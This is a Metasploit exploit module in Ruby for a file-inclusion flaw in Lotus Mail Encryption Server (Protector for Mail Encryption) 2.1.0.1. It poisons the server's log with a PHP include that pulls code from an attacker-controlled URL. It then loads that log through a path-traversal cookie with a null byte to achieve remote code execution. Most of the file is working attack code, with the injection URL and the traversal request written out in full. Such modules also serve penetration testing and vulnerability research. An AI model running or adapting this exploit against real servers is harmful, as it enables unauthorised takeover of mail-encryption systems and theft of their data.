##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Remote::HttpServer::PHPInclude

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Lotus Mail Encryption Server (Protector for Mail) Local File Inclusion',
			'Description'    => %q{
				This module exploits a local file inclusion vulnerability in
				the Lotus Mail Encryption Server (Protector for Mail Encryption)
				administration setup interface. The index.php file uses an unsafe include()
				where an unauthenticated remote user may read (traversal) arbitrary file contents.
				By abusing a second bug within Lotus, we can inject our payload
				into a known location and call it via the LFI to gain remote code execution.
				Version 2.1.0.1 Build(88.3.0.1.4323) is known to be vulnerable.
				You may need to set DATE in the format YYYY-MM-DD to get this working,
				where the remote host and metasploit instance have UTC timezone differences.
			},
			'Author'         => [ 'patrick' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'URL', 'http://www.osisecurity.com.au/advisories/' ], #0day
					#[ 'CVE', 'X' ],
					[ 'OSVDB', '87556'],
					#[ 'BID', 'X' ],
				],
			'Privileged'     => false,
			'Platform'       => 'php',
			'Arch'           => ARCH_PHP,
			'Targets'        => [[ 'Lotus Mail Encryption Server 2.1.0.1', { }]],
			'DisclosureDate' => 'Nov 9 2012',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(9000),
				OptBool.new('SSL', [true, 'Use SSL', true]),
				OptString.new("DATE", [false, 'The date of the target system log file in YYYY-MM-DD format']),
			], self.class)
	end

	def check
		res = send_request_cgi( { 'uri' => '/' })
		if (res.code == 302 && res.body.match(/GetLoginScreen.uevent/))
			return Exploit::CheckCode::Detected
		end
		return Exploit::CheckCode::Safe
	end

	def php_exploit

		logfile = datastore['DATE'] ? datastore['DATE'] : Time.now.strftime("%Y-%m-%d")
		if (logfile !~ /\d\d\d\d-\d\d-\d\d/) # if set by user datastore...
			print_error("DATE is in incorrect format (use 'YYYY-MM-DD'). Unable to continue.")
			return
		end

		# set up the initial log file RCE - this is unescaped ascii so we can execute it
		# later >:) uid is tomcat so we cannot read apache's logs, and we are stuck inside
		# tomcat's php-cgi wrapper which prevents /proc/* injection and a lot of the
		# filesystem. example good injected log: '/var/log/ovid/omf-2012-08-01.log' patrick

		inject_url = "/omc/GetSetupScreen.event?setupPage=<?php+include+'#{php_include_url}';+?>" # no whitespace
		res = send_request_cgi( { 'uri' => inject_url })

		if (res and res.code == 404 and res.body.match(/Lotus Protector for Mail Encryption - Page Not Found/)) # it returns a 404 but this is good.
			vprint_good("Payload injected...")

			response = send_request_cgi( {
				'uri' => '/omc/pme/index.php',
				'cookie' => "slaLANG=../../../../../../var/log/ovid/omf-#{logfile}.log%00;", # discard .php
			})
		end
	end
end